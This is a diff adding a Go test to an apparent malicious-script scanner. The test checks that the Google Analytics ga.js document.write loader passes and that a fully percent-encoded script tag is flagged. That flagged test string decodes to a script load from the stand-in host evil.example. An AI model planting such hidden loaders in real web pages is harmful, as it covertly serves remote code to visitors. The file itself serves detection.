@@ -59,3 +59,19 @@ func TestFleetRestoredCategories(t *testing.T) {
 		t.Error("program hidden in a plugin's vendor folder: no longer caught")
 	}
 }
+
+// Old embed codes write a script tag with document.write(unescape(...))
+// (Google Analytics' ga.js loader, lead and chat widgets): only the
+// brackets are escaped and the address is readable. A script or hidden
+// frame spelled out in escaped letters is still reported.
+func TestFleetDocumentWriteUnescape(t *testing.T) {
+	ga := `var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));`
+	if v := AnalyzeScript("js", []byte(ga)); v != nil {
+		t.Errorf("ga.js loader reported as %s", v.Signature)
+	}
+	hidden := `document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%3E%3C%2F%73%63%72%69%70%74%3E'));`
+	if v := AnalyzeScript("js", []byte(hidden)); v == nil {
+		t.Error("escaped script not reported")
+	}
+}
